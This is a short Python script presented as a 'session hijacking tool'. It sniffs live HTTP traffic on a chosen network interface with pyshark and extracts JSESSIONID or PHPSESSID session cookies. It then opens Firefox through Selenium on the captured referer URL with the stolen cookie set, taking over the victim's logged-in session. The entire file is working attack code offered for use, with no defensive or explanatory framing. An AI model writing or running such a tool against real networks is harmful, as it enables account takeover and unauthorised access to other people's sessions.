#!/usr/bin/env python3
# Paweł Rubin 2019
#
"""Session hijacking tool."""
from typing import List
from argparse import ArgumentParser

import pyshark
from selenium import webdriver


def parse_cookies(cookies: str) -> List[dict]:
    """Returns list of cookies in form {"name": <cookie_name>, "value": <cookie_value>}"""
    return [
        {"name": cookie[0], "value": cookie[1]}
        for cookie in [cookie.split("=") for cookie in cookies.split("; ")]
    ]


class SessionCookieNotFoundError(Exception):
    """Raised when http cookies do not contain session cookie."""


def get_session_cookie(cookies: str) -> dict:
    """Return session cookie from http.cookies.
    Raises SessionCookieNotFoundError"""
    try:
        return next(
            cookie
            for cookie in parse_cookies(cookies)
            if cookie["name"] == "JSESSIONID" or cookie["name"] == "PHPSESSID"
        )
    except StopIteration:
        raise SessionCookieNotFoundError()


def hijack_session(interface):
    """Listens on given interface until session cookie has been found.
    Opens Firefox webdriver with the cookie."""
    capture = pyshark.LiveCapture(
        interface=interface, display_filter="http.cookie || http.cookie_pair"
    )

    for packet in capture.sniff_continuously():
        try:
            base_url = packet.http.referer
            session_cookie = get_session_cookie(packet.http.cookie)
            browser = webdriver.Firefox()
            browser.get(base_url)
            browser.add_cookie(session_cookie)
            browser.refresh()
            break
        except (AttributeError, SessionCookieNotFoundError):
            continue

def parse_cli():
    """Parses command line arguments."""
    parser = ArgumentParser()

    parser.add_argument(
        "--interface",
        "-i",
        type=str,
        required=True,
        help="Network interface name.",
    )

    return parser.parse_args()

if __name__ == "__main__":
    args = parse_cli()
    hijack_session(args.interface)
